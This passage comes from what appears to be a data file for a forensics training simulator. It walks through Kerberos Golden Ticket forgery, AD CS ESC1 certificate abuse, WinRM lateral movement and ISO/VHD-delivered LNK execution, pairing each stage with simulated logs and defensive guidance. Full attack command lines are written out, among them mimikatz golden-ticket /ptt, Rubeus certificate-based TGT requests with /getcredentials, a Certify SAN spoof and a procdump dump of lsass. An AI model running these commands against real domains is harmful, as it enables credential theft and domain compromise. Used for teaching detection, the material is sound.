      'Grounded in Microsoft Defender for Identity Kerberos analytics, CERT-FR Active Directory Golden Ticket detection guides, and MITRE ATT&CK T1558.001: after stealing the krbtgt hash, an attacker forges a custom TGT offline using Mimikatz or Rubeus and injects it via Pass-the-Ticket, producing three definitive KDC forensic anomalies on Domain Controllers: (1) an orphaned EventID 4769 (TGS-REQ) with no preceding EventID 4768 (AS-REQ), (2) a non-existent or forged Privilege Attribute Certificate (PAC) user/RID (e.g., RID 500 with fake username), and (3) a 10-year ticket lifetime or RC4 (0x17) encryption downgrade.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Rubeus / Mimikatz ptt Host', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Kerberos KDC TCP/UDP :88', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'CORP-DC01 (kdcsvc.dll)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'EID 4768 vs 4769 Correlation', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'CIFS/CORP-DC01 Target Service', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Offline TGT Forgery with Stolen krbtgt Key & Pass-the-Ticket LsaCallAuthenticationPackage',
        narration:
          'On a compromised workstation, the attacker runs kerberos::golden /domain:corp.local /sid:S-1-5-21-3819201 /aes256:<krbtgt_key> /user:ghost_admin /id:500 /groups:512,513,518,519,520 /ptt. Because the TGT is encrypted locally using the stolen krbtgt key and injected directly into LSASS via LsaCallAuthenticationPackage (KERB_SUBMIT_TICKET_MESSAGE), zero AS-REQ traffic (EventID 4768) is sent to the Domain Controller.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Credential Access (T1558.001 - Steal or Forge Kerberos Tickets: Golden Ticket)',
        technicalCommands: [
          'mimikatz "kerberos::golden /domain:corp.local /sid:S-1-5-21-3819201 /aes256:4f91a82b... /user:ghost_admin /id:500 /ptt"',
          'LsaCallAuthenticationPackage(KerbSubmitTicketMessage) injects forged TGT into current LogonId',
          'Missing Artifact: Zero EventID 4768 (AS-REQ) generated on CORP-DC01',
        ],
        defenseMitigation:
          'Monitor userland calls to LsaCallAuthenticationPackage with KerbSubmitTicketMessage from non-standard binaries and audit KDC EventID 4768 vs 4769 ratios.',
        logs: [
          {
            id: 'dfir-golden-1',
            timestamp: '17:02:10.100',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 10,
            ProcessName: 'rubeus.exe',
            CommandLine: 'rubeus.exe golden /aes256:4f91a82b... /user:ghost_admin /id:500 /domain:corp.local /sid:S-1-5-21-3819201 /ptt',
            raw: 'EventID: 10 | SourceImage: C:\\Users\\Public\\rubeus.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | CallTrace: secur32.dll!LsaCallAuthenticationPackage (KerbSubmitTicketMessage) | ForgedPrincipal: ghost_admin@CORP.LOCAL (RID 500)',
            parsedFields: {
              Technique: 'Offline Golden Ticket Forgery + Pass-the-Ticket (/ptt)',
              ForgedUserAndRid: 'ghost_admin (RID 500 Domain Admin)',
              InjectedDefaultLifetime: '10 Years (Mimikatz default EndTime - StartTime)',
              KdcAsReqBypassed: 'True (No EventID 4768 generated)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Orphaned TGS-REQ (Security EventID 4769 Without Preceding 4768) & PAC Validation Anomaly',
        narration:
          'When the attacker accesses \\\\CORP-DC01\\C$, the workstation presents the forged TGT in a KRB_TGS_REQ to CORP-DC01. The KDC decrypts the TGT with its krbtgt key and logs Security EventID 4769 (A Kerberos service ticket was requested) for TargetUserName=ghost_admin@CORP.LOCAL and ServiceName=cifs/CORP-DC01.corp.local—creating an orphaned 4769 for a principal that never authenticated via 4768 (and since Windows Nov 2021 KB5008380 PAC enhancements, mismatches between the PAC SID and SAM account trigger KDC failure 0x25 / EventID 4769 Status 0x6).',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Lateral Movement (T1550.003 - Use Alternate Authentication Material: Pass the Ticket)',
        technicalCommands: [
          'KDC Security EventID 4769: Account_Name=ghost_admin@CORP.LOCAL Service_Name=cifs/CORP-DC01.corp.local',
          'SIEM Anomaly 1: EventID 4769 observed for ghost_admin with zero EventID 4768 in preceding 10 hours',
          'SIEM Anomaly 2: TicketEncryptionType=0x17 (RC4 downgrade) or Zeek kerberos.log till-from = 315360000s (10 years)',
        ],
        defenseMitigation:
          'Deploy SIEM stateful correlation rules alerting on any Kerberos EventID 4769 where the AccountName has no corresponding EventID 4768 within the domain maximum ticket lifetime policy (default 10 hours).',
        logs: [
          {
            id: 'dfir-golden-2',
            timestamp: '17:02:14.420',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 4769,
            ProcessName: 'lsass.exe',
            CommandLine: 'KRB_TGS_REQ ServiceName=cifs/CORP-DC01.corp.local AccountName=ghost_admin@CORP.LOCAL',
            raw: 'EventID: 4769 | Computer: CORP-DC01.corp.local | TargetUserName: ghost_admin@CORP.LOCAL | TargetDomainName: CORP.LOCAL | ServiceName: cifs/CORP-DC01.corp.local | IpAddress: ::ffff:10.10.4.22 | TicketOptions: 0x40810000 | TicketEncryptionType: 0x17 | Status: 0x0',
            parsedFields: {
              EventID: '4769 (Kerberos Service Ticket Requested)',
              OrphanedTicketAnomaly: 'Zero preceding EventID 4768 (AS-REQ) for ghost_admin',
              TicketEncryptionType: '0x17 (RC4-HMAC Downgrade)',
              ServiceName: 'cifs/CORP-DC01.corp.local',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Target Host LogonType 3 with Synthetic Domain Admin PAC Groups (Security EventID 4624 & 4672)',
        narration:
          'Upon receiving the TGS, the attacker mounts \\\\CORP-DC01\\C$, generating Security EventID 4624 (LogonType 3, AuthenticationPackageName=Kerberos) and EventID 4672 (Special privileges assigned to new logon) on CORP-DC01—granting SeDebugPrivilege and SeBackupPrivilege to a username (ghost_admin) that does not exist in Active Directory.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Privilege Escalation (T1558.001 - Forged PAC Group RIDs 512/519)',
        technicalCommands: [
          'Security EventID 4624: LogonType=3 AuthenticationPackageName=Kerberos TargetUserName=ghost_admin',
          'Security EventID 4672: SubjectUserSid=S-1-5-21-3819201-500 PrivilegeList=SeDebugPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege',
        ],
        defenseMitigation:
          'Enforce KB5008380 (PAC Requestor SID enforcement) across all Domain Controllers and rotate the krbtgt password twice immediately upon detecting an orphaned EventID 4769 or phantom RID-500 logon.',
        logs: [
          {
            id: 'dfir-golden-3',
            timestamp: '17:02:14.890',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 4624,
            ProcessName: 'lsass.exe',
            CommandLine: 'Kerberos LogonType 3 as ghost_admin (Forged RID 500 PAC)',
            raw: 'EventID: 4624 | LogonType: 3 | TargetUserSid: S-1-5-21-3819201-500 | TargetUserName: ghost_admin | TargetDomainName: CORP.LOCAL | LogonProcessName: Kerberos | IpAddress: 10.10.4.22 | Correlated EventID 4672: SeDebugPrivilege',
            parsedFields: {
              EventID: '4624 (Network Logon) + 4672 (Admin Privileges Assigned)',
              TargetUserSid: 'S-1-5-21-3819201-500 (RID 500)',
              TargetUserName: 'ghost_admin (Non-Existent AD Object)',
              AuthenticationPackage: 'Kerberos',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-adcs-esc1-petitpotam-certificate-enrollment-eid4886',
    title: 'SpecterOps, Microsoft ADV210003 & CISA DFIR — AD CS ESC1 SubjectAltName Spoofing & PKINIT Forensics (EID 4886 / 4768)',
    category: 'ACTIVE_DIRECTORY',
    mitreId: 'T1649',
    description:
      'Grounded in SpecterOps "Certified Pre-Owned" research, Microsoft Security Advisory ADV210003, and MITRE ATT&CK T1649: an attacker abuses an Active Directory Certificate Services (AD CS) template with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (ESC1) to request a client authentication certificate specifying a Domain Admin User Principal Name (UPN) in the Subject Alternative Name (SAN) extension (CertificationAuthority EventID 4886 / 4887) and exchanges it for a Domain Admin TGT via PKINIT (KDC EventID 4768 with CertificateThumbprint).',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Certify.exe / Certipy Host', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'DCOM ICertRequestD2 RPC', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'CORP-CA01 (certsrv.exe)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'CA EID 4886/4887 & KDC 4768', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'CORP-DC01 PKINIT KDC (:88)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: ESC1 Vulnerable Certificate Template Enumeration over LDAP (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)',
        narration:
          'Using Certify.exe find /vulnerable or Certipy, the attacker queries CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local and identifies a template ("CorpVPNUser") where Domain Users have Enroll rights, EKU includes Client Authentication (1.3.6.1.5.5.7.3.2), and msPKI-Certificate-Name-Flag has bit 0x00000001 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) enabled.',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Discovery (T1649 - Steal or Forge Authentication Certificates: ESC1 Discovery)',
        technicalCommands: [
          'Certify.exe find /vulnerable',
          'LDAP Filter: (&(objectclass=pkicertificatetemplate)(msPKI-Certificate-Name-Flag:1.2.840.113556.1.4.804:=1))',
          'Vulnerable Template: CorpVPNUser (EnrolleeSuppliesSubject=True, ClientAuth EKU=1.3.6.1.5.5.7.3.2)',
        ],
        defenseMitigation:
          'Audit all AD CS certificate templates regularly with Locksmith or PSPKI and disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on any template granting enrollment rights to low-privileged groups.',
        logs: [
          {
            id: 'dfir-adcs-1',
            timestamp: '12:10:04.115',
            source: 'Network',
            severity: 'high',
            EventCode: 389,
            ProcessName: 'Certify.exe',
            CommandLine: 'Certify.exe find /vulnerable (Querying CN=Certificate Templates)',
            raw: 'LDAP_SEARCH: BaseDN="CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" Attrs="msPKI-Certificate-Name-Flag,pKIExtendedKeyUsage" MatchedTemplate="CorpVPNUser (0x1 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)"',
            parsedFields: {
              VulnerableTemplate: 'CorpVPNUser',
              NameFlagBit: '0x00000001 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)',
              ExtendedKeyUsage: '1.3.6.1.5.5.7.3.2 (Client Authentication)',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: CSR Submission with Spoofed Domain Admin SAN UPN (CA Security EventID 4886 & 4887)',
        narration:
          'The low-privileged user (CORP\\jdoe) submits a PKCS#10 CSR to CORP-CA01 specifying /altname:Administrator@corp.local. On CORP-CA01, certsrv.exe logs Security EventID 4886 (Certificate Services received a certificate request) and EventID 4887 (Approved and issued a certificate) where Requester="CORP\\jdoe" mismatches the issued SubjectAltName="upn=Administrator@corp.local" (and post-KB5014754 logs Microsoft-Windows-CertificationAuthority EID 53/54 if strong mapping is missing).',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Credential Access (T1649 - AD CS ESC1 SAN Spoofing & EventID 4886/4887)',
        technicalCommands: [
          'Certify.exe request /ca:CORP-CA01.corp.local\\corp-CA /template:CorpVPNUser /altname:Administrator@corp.local',
          'CA Security EventID 4886 & 4887: Requester=CORP\\jdoe | SubjectAltName="otherName:Principal Name=Administrator@corp.local"',
        ],
        defenseMitigation:
          'Enable Audit Certification Services on all Enterprise CAs (configuring auditfilter 127 via certutil -setreg CA\\AuditFilter 127) so EventID 4886 and 4887 log the SubjectAltName field, and alert whenever Requester UPN != SAN UPN.',
        logs: [
          {
            id: 'dfir-adcs-2',
            timestamp: '12:10:09.612',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 4887,
            ProcessName: 'certsrv.exe',
            CommandLine: 'ICertRequestD2::Request Template=CorpVPNUser SAN=Administrator@corp.local',
            raw: 'EventID: 4887 | Computer: CORP-CA01.corp.local | Requester: CORP\\jdoe | RequestId: 1482 | CertificateTemplate: CorpVPNUser | SubjectName: CN=jdoe | SubjectAltName: upn=Administrator@corp.local | Disposition: Issued',
            parsedFields: {
              EventID: '4886 (CSR Received) / 4887 (Certificate Issued)',
              RequesterAccount: 'CORP\\jdoe (Low-Privileged User)',
              SpoofedSubjectAltName: 'upn=Administrator@corp.local (Domain Admin)',
              CertificateSerialNumber: '61000005C9A18204B19283740000000005C9',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Kerberos PKINIT Authentication & NT Hash Extraction via Unpac-the-Hash (KDC EventID 4768)',
        narration:
          'The attacker converts the issued certificate to a PFX and runs Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /getcredentials. CORP-DC01 validates the certificate via PKINIT (PA-PK-AS-REQ) and logs Security EventID 4768 (A Kerberos authentication ticket (TGT) was requested) where TargetUserName=Administrator and CertIssuerName="corp-CA" / CertThumbprint is populated instead of password pre-authentication, while Rubeus decrypts the PAC_CREDENTIAL_INFO structure to recover Administrator’s permanent NTLM hash.',
        activeNodes: ['attacker', 'ad', 'siem'],
        mitreTactic: 'Privilege Escalation (T1649 - PKINIT EventID 4768 & Unpac-the-Hash)',
        technicalCommands: [
          'Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /getcredentials /ptt',
          'KDC Security EventID 4768: TargetUserName=Administrator PreAuthType=16 (PA-PK-AS-REQ) CertThumbprint=9F8E7D6C5B4A...',
          'Unpac-the-Hash: Decrypts PAC_CREDENTIAL_INFO (NTLMCredentialData) using AS-REP session key',
        ],
        defenseMitigation:
          'Enforce KB5014754 Full Enforcement mode (StrongCertificateBindingEnforcement=2) so certificates lacking the OID 1.3.6.1.4.1.311.25.2 Sid-Extension matching the target user objectSid are rejected by the KDC (KDC_ERR_INCONSISTENT_KEY_PURPOSE / EventID 39/41).',
        logs: [
          {
            id: 'dfir-adcs-3',
            timestamp: '12:10:15.208',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 4768,
            ProcessName: 'lsass.exe',
            CommandLine: 'PKINIT AS-REQ (PreAuthType=16) for Administrator using CertSerial 61000005C9...',
            raw: 'EventID: 4768 | Computer: CORP-DC01.corp.local | TargetUserName: Administrator | PreAuthType: 16 | CertIssuerName: corp-CA | CertSerialNumber: 61000005C9A18204B19283740000000005C9 | CertThumbprint: 9F8E7D6C5B4A392817263544556677889900AABB',
            parsedFields: {
              EventID: '4768 (Kerberos TGT Requested via PKINIT)',
              PreAuthType: '16 (PA-PK-AS-REQ SmartCard/Certificate)',
              TargetUserName: 'Administrator',
              CertThumbprint: '9F8E7D6C5B4A392817263544556677889900AABB',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-winrm-wsman-remote-powershell-eid91-4624',
    title: 'Microsoft WinRM, CrowdStrike & SigmaHQ DFIR — WinRM / WS-Management Lateral Movement & wsmprovhost.exe Forensics',
    category: 'ACTIVE_DIRECTORY',
    mitreId: 'T1021.006',
    description:
      'Grounded in Microsoft Windows Remote Management (WinRM) Operational Logging specifications, CrowdStrike lateral movement hunting guides, and MITRE ATT&CK T1021.006: an attacker pivots laterally using Enter-PSSession or Invoke-Command over TCP 5985/5986 (/wsman), generating WinRM/Operational EventID 142 (Source Client) and EventID 91 (Destination Server Shell Creation), Security EventID 4624 (LogonType 3), and child processes under C:\\Windows\\System32\\wsmprovhost.exe.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Source Host (Invoke-Command)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'HTTP.sys /wsman (:5985/:5986)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'svchost.exe (WinRM Service)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'WinRM EID 91/142 & PowerShell', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'wsmprovhost.exe Host Process', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Outbound WSMan Session Initialization on Source Host (WinRM EventID 142 & 6)',
        narration:
          'When the attacker runs Invoke-Command -ComputerName SRV-SQL01 -ScriptBlock { ... } on the source workstation, Microsoft-Windows-WinRM/Operational on the source host logs EventID 6 (Creating WSMan session) showing the exact destination connection URI (http://SRV-SQL01:5985/wsman?PSVersion=5.1).',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Lateral Movement (T1021.006 - Remote Services: Windows Remote Management)',
        technicalCommands: [
          'Invoke-Command -ComputerName SRV-SQL01.corp.local -ScriptBlock { procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\sql.dmp }',
          'Source WinRM/Operational EventID 6: Creating WSMan session to connection http://SRV-SQL01.corp.local:5985/wsman',
        ],
        defenseMitigation:
          'Collect Microsoft-Windows-WinRM/Operational EventID 6 and 142 across endpoints to reconstruct outbound WinRM lateral movement hops.',
        logs: [
          {
            id: 'dfir-winrm-1',
            timestamp: '20:11:02.110',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 6,
            ProcessName: 'powershell.exe',
            CommandLine: 'Invoke-Command -ComputerName SRV-SQL01.corp.local -ScriptBlock { ... }',
            raw: 'LogName: Microsoft-Windows-WinRM/Operational | EventID: 6 | Computer: WKS-04.corp.local | Description: Creating WSMan session. The connection string is: SRV-SQL01.corp.local/wsman?PSVersion=5.1.19041.3570',
            parsedFields: {
              LogChannel: 'Microsoft-Windows-WinRM/Operational (Source Host)',
              EventID: '6 (Creating WSMan Session)',
              TargetConnectionUri: 'http://SRV-SQL01.corp.local:5985/wsman',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Destination Server WSMan Shell Creation (WinRM EventID 91 & Security EventID 4624 Type 3)',
        narration:
          'On destination server SRV-SQL01, HTTP.sys receives the SOAP POST /wsman request on port 5985. Security logs EventID 4624 (LogonType 3 Network), and Microsoft-Windows-WinRM/Operational logs EventID 91 (Creating WSMan shell on server with ResourceUri http://schemas.microsoft.com/powershell/Microsoft.PowerShell and clientIP 10.10.4.15).',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Lateral Movement (T1021.006 - Destination WinRM EventID 91 Shell Creation)',
        technicalCommands: [
          'Destination WinRM/Operational EventID 91: Creating WSMan shell with ResourceUri http://schemas.microsoft.com/powershell/Microsoft.PowerShell (clientIP: 10.10.4.15)',
          'Destination PowerShell/Operational EventID 400 / 40961: HostName=ServerRemoteHost',
        ],
        defenseMitigation:
          'Restrict WinRM access via Windows Firewall IP allowlists and Group Policy (Allow remote server management through WinRM IPv4 filter) and alert on WinRM EventID 91 from non-PAW (Privileged Access Workstation) IPs.',
        logs: [
          {
            id: 'dfir-winrm-2',
            timestamp: '20:11:02.480',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 91,
            ProcessName: 'svchost.exe',
            CommandLine: 'svchost.exe -k NetworkService -s WinRM (Creating WSMan shell for CORP\\admin_ops)',
            raw: 'LogName: Microsoft-Windows-WinRM/Operational | EventID: 91 | Computer: SRV-SQL01.corp.local | Description: Creating WSMan shell on server with ResourceUri: http://schemas.microsoft.com/powershell/Microsoft.PowerShell (user: CORP\\admin_ops, clientIP: 10.10.4.15)',
            parsedFields: {
              LogChannel: 'Microsoft-Windows-WinRM/Operational (Destination Host)',
              EventID: '91 (Creating WSMan Shell)',
              ResourceUri: 'http://schemas.microsoft.com/powershell/Microsoft.PowerShell',
              ClientIp: '10.10.4.15',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: wsmprovhost.exe Child Process Spawning & ServerRemoteHost ScriptBlock Logging (Sysmon EID 1 & PS 4104)',
        narration:
          'The WinRM service spawns the WS-Management Provider Host (C:\\Windows\\System32\\wsmprovhost.exe -Embedding), which initializes the PowerShell runspace (HostName=ServerRemoteHost) and spawns any external binaries invoked by the attacker script block (Sysmon EventID 1 with ParentImage=wsmprovhost.exe).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1059.001 - wsmprovhost.exe Parentage & ServerRemoteHost)',
        technicalCommands: [
          'Sysmon EventID 1: ParentImage=C:\\Windows\\System32\\wsmprovhost.exe -> Image=C:\\Users\\Public\\procdump64.exe',
          'Windows PowerShell EventID 400: HostName=ServerRemoteHost HostApplication=C:\\Windows\\System32\\wsmprovhost.exe -Embedding',
        ],
        defenseMitigation:
          'Hunt for Sysmon EventID 1 events where ParentImage ends with \\wsmprovhost.exe or \\winrsHost.exe, and correlate with PowerShell EventID 4104 executed within the same timeframe.',
        logs: [
          {
            id: 'dfir-winrm-3',
            timestamp: '20:11:03.112',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'wsmprovhost.exe',
            CommandLine: 'C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\sql.dmp',
            raw: 'EventID: 1 | Computer: SRV-SQL01.corp.local | ParentImage: C:\\Windows\\System32\\wsmprovhost.exe | ParentCommandLine: C:\\Windows\\System32\\wsmprovhost.exe -Embedding | Image: C:\\Users\\Public\\procdump64.exe | CommandLine: procdump64.exe -accepteula -ma lsass.exe C:\\Temp\\sql.dmp',
            parsedFields: {
              EventID: '1 (Sysmon ProcessCreate)',
              ParentImage: 'C:\\Windows\\System32\\wsmprovhost.exe',
              ChildImage: 'C:\\Users\\Public\\procdump64.exe',
              PowerShellHostName: 'ServerRemoteHost',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-vhd-iso-motw-bypass-zone-identifier-forensics',
    title: 'Microsoft Threat Intel & Elastic DFIR — ISO / VHD Virtual Disk Mount, Zone.Identifier ADS & LNK Shellbags Forensics',
    category: 'MALWARE',
    mitreId: 'T1553.005',
    description:
      'Grounded in Microsoft Threat Intelligence Mark-of-the-Web (MotW) research, Elastic Security Labs container delivery analysis, and MITRE ATT&CK T1553.005: an initial-access payload is delivered inside an optical/virtual disk container (Invoice_Oct.iso / .vhd). Double-clicking mounts the container as a virtual drive letter via vhdmp.sys (logging VHDMP-Operational EventID 1 / 12 and Sysmon EventID 15 Zone.Identifier ADS on the outer container), while the user’s interaction inside the mounted volume is recorded in USRCLASS.DAT Shellbags and a weaponized .lnk file.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Malicious Container (Invoice.vhd)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'NTFS Zone.Identifier (Sysmon 15)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'vhdmp.sys Virtual Disk Mount', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'VHDMP EID 1/12 & Shellbags', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Mounted Volume E:\\ (.lnk + DLL)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Container Download & NTFS Zone.Identifier Alternate Data Stream Creation (Sysmon EventID 15)',
        narration:
          'When the user downloads Invoice_Oct.vhd from an external webmail link, the browser writes the NTFS Alternate Data Stream Invoice_Oct.vhd:Zone.Identifier containing [ZoneTransfer] ZoneId=3 (Internet), ReferrerUrl, and HostUrl. Sysmon EventID 15 (FileCreateStreamHash) captures the exact Contents of the Zone.Identifier stream.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1566.002 - Spearphishing Link & Mark-of-the-Web ADS)',
        technicalCommands: [
          'Sysmon EventID 15 (FileCreateStreamHash): TargetFilename=C:\\Users\\jdoe\\Downloads\\Invoice_Oct.vhd:Zone.Identifier',
          'ADS Content: [ZoneTransfer] ZoneId=3 ReferrerUrl=https://mail.external-share.com/ HostUrl=https://cdn.external-share.com/Invoice_Oct.vhd',
        ],
        defenseMitigation:
          'Enable Sysmon EventID 15 to capture Zone.Identifier Alternate Data Streams at download time, preserving the original HostUrl and ReferrerUrl even if the user later deletes the container.',
        logs: [
          {
            id: 'dfir-vhd-1',
            timestamp: '09:30:11.204',
            source: 'Sysmon',
            severity: 'high',
            EventCode: 15,
            ProcessName: 'msedge.exe',
            CommandLine: 'msedge.exe writing C:\\Users\\jdoe\\Downloads\\Invoice_Oct.vhd:Zone.Identifier',
            raw: 'EventID: 15 | Image: C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe | TargetFilename: C:\\Users\\jdoe\\Downloads\\Invoice_Oct.vhd:Zone.Identifier | Contents: [ZoneTransfer]  ZoneId=3  ReferrerUrl=https://portal.doc-delivery.net/  HostUrl=https://portal.doc-delivery.net/Invoice_Oct.vhd',
            parsedFields: {
              EventID: '15 (Sysmon FileCreateStreamHash)',
              AlternateDataStream: 'Invoice_Oct.vhd:Zone.Identifier',
              ZoneId: '3 (URLZONE_INTERNET)',
              HostUrl: 'https://portal.doc-delivery.net/Invoice_Oct.vhd',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: Virtual Disk Mount via vhdmp.sys & Microsoft-Windows-VHDMP-Operational EventID 1 / 12',
        narration:
          'When the user double-clicks Invoice_Oct.vhd, Windows Explorer mounts the virtual hard disk via the VHD Miniport Driver (vhdmp.sys) as drive E:\\. Microsoft-Windows-VHDMP-Operational logs EventID 1 (VHD surfaced as disk number 2) and EventID 12 (File C:\\Users\\jdoe\\Downloads\\Invoice_Oct.vhd opened as virtual disk). Prior to Windows 11 22H2 / KB5019959, FAT32/UDF files inside ISO/VHD containers did not inherit the outer MotW Zone.Identifier.',
        activeNodes: ['firewall', 'target', 'ad', 'siem'],
        mitreTactic: 'Defense Evasion (T1553.005 - Subvert Trust Controls: Mark-of-the-Web Bypass)',
        technicalCommands: [
          'Microsoft-Windows-VHDMP-Operational EventID 1: VHD C:\\Users\\jdoe\\Downloads\\Invoice_Oct.vhd surfaced as Disk #2',
          'Microsoft-Windows-VHDMP-Operational EventID 12: Virtual disk handle opened by System (PID 4)',
          'System EventID 157 / Partition-Diagnostic: Virtual disk mounted at volume E:\\',
        ],
        defenseMitigation:
          'Change default file associations for .iso, .vhd, .vhdx, and .img away from Windows Explorer Disc Image Mounter via GPO and monitor Microsoft-Windows-VHDMP-Operational EventID 1 and 12.',
        logs: [
          {
            id: 'dfir-vhd-2',
            timestamp: '09:30:18.540',
            source: 'WinEvent',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'explorer.exe',
            CommandLine: 'explorer.exe mounting C:\\Users\\jdoe\\Downloads\\Invoice_Oct.vhd -> Volume E:\\',
            raw: 'LogName: Microsoft-Windows-VHDMP-Operational | EventID: 1 | VhdFile: C:\\Users\\jdoe\\Downloads\\Invoice_Oct.vhd | VhdType: 1 (FIXED) | DiskNumber: 2 | Status: 0x0',
            parsedFields: {
              LogChannel: 'Microsoft-Windows-VHDMP-Operational',
              EventID: '1 (VHD Surfaced) / 12 (VHD Handle Opened)',
              MountedContainerPath: 'C:\\Users\\jdoe\\Downloads\\Invoice_Oct.vhd',
              MountedDriveLetter: 'E:\\ (DiskNumber 2)',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: USRCLASS.DAT Shellbags E:\\ Navigation & Weaponized .LNK Execution (LECmd & SBECmd)',
        narration:
          'Inside the newly mounted E:\\ drive, the user opens E:\\Invoice_Oct.lnk (which hides a hidden E:\\rundll32_loader.dll). Even after the attacker unmounts E:\\ and deletes Invoice_Oct.vhd, Windows Explorer records the user browsing E:\\ inside USRCLASS.DAT (Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU) and creates a Jump List / Recent LNK record in %APPDATA%\\Microsoft\\Windows\\Recent\\ containing the LNK TrackerDataBlock MachineID and VolumeDroid.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1204.002 - User Execution: Malicious File & LNK/Shellbag Artifacts)',
        technicalCommands: [
          'SBECmd.exe -d "C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\Windows" --csv C:\\Forensics  # Parses USRCLASS.DAT BagMRU for E:\\',
          'LECmd.exe -d "C:\\Users\\jdoe\\AppData\\Roaming\\Microsoft\\Windows\\Recent" --csv C:\\Forensics  # Parses Invoice_Oct.lnk target args',
          'LNK Target: C:\\Windows\\System32\\rundll32.exe E:\\rundll32_loader.dll,DllRegisterServer',
        ],
        defenseMitigation:
          'Correlate VHDMP-Operational EventID 1/12 with USRCLASS.DAT Shellbags (SBECmd) and Recent LNK files (LECmd) to reconstruct the full container-to-LNK-to-DLL execution chain.',
        logs: [
          {
            id: 'dfir-vhd-3',
            timestamp: '09:30:22.910',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'rundll32.exe',
            CommandLine: 'C:\\Windows\\System32\\rundll32.exe E:\\rundll32_loader.dll,DllRegisterServer',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\explorer.exe | Image: C:\\Windows\\System32\\rundll32.exe | CommandLine: rundll32.exe E:\\rundll32_loader.dll,DllRegisterServer | ShellbagPath: USRCLASS.DAT\\BagMRU\\0\\3 (My Computer\\E:\\) | RecentLnk: Invoice_Oct.lnk',
            parsedFields: {
              EventID: '1 (Sysmon ProcessCreate)',
              LnkTargetCommand: 'rundll32.exe E:\\rundll32_loader.dll,DllRegisterServer',
              ShellbagArtifact: 'USRCLASS.DAT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU (Drive E:\\)',
              RecentLnkArtifact: '%APPDATA%\\Microsoft\\Windows\\Recent\\Invoice_Oct.lnk',
            },
          },
        ],
      },
    ],
  },
  {
    id: 'dfir-printspooler-spl-shd-spool-file-persistence',
